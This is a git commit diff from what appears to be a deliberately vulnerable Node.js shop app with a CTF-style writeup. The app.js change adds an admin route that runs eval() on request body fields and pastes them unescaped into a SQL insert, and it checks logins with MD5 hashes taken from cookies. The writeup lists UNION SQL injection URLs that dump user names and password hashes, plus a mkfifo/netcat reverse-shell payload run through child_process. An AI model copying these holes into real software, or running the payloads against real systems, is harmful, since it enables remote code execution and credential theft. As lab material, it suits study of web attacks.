3a9a1ac76ca38dde4803a868ec165ccb33411104
n8x0b7T <deretilium@protonmail.com>
2023-04-04 00:52:15 -0400

    everything works!

--- app.js
+++ app.js
@@ -5,6 +5,12 @@ app.use(cookieParser());
 
 const crypto = require('crypto');
 
+const bodyParser = require('body-parser');
+
+app.use(bodyParser.urlencoded({ extended: false }));
+
+app.use(bodyParser.json());
+
 var mysql = require('mysql');
 const { hasSubscribers } = require('diagnostics_channel');
 var connection = mysql.createConnection({
@@ -70,5 +76,52 @@ app.get('/admin', function (req, res) {
 
 
 })
+
+
+
+app.post('/admin', function (req, res) {
+    connection.query(`SELECT * from ShopUser`, function (error, results, fields) {
+        if (error) {
+            res.status(500)
+            console.log(error)
+        }
+
+        if (req.cookies.password) {
+
+            hash = crypto.createHash('md5').update(req.cookies.password).digest('hex');
+        } else {
+            res.sendFile(`${__dirname}/admin.html`);
+        }
+
+        loggedIn = false
+        for (i = 0; i < results.length; i++) {
+
+            if (results[i].userName == req.cookies.username &&
+                results[i].userHash == hash) {
+                // res.sendFile(`${__dirname}/loggedin.html`);
+
+                loggedIn = true;
+            }
+
+        }
+        console.log("post!")
+
+        if (loggedIn) {
+
+            connection.query(
+                `insert into ShopItem(itemID, itemName, itemPrice, itemStock) values(${eval(req.body.itemID)}, "${eval(req.body.itemName)}", ${(req.body.itemPrice)}, ${eval(req.body.itemStock)});`,
+                function (error, results, fields) {
+                    console.log(error)
+                })
+
+            res.send(req.query)
+
+        }
+
+    });
+
+
+})
+
 
 app.listen(3000)
--- writeup.md
+++ writeup.md
@@ -6,3 +6,7 @@ http://localhost:3000/search?s=%22%20and%201=2%20UNION%20SELECT%201,%20column_na
 
 
 http://localhost:3000/search?s=%22%20and%201=2%20UNION%20SELECT%20userID,%20userHash,%20userName,%201%20FROM%20ShopUser%20%20--%20
+
+
+
+require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 1337 >/tmp/f')
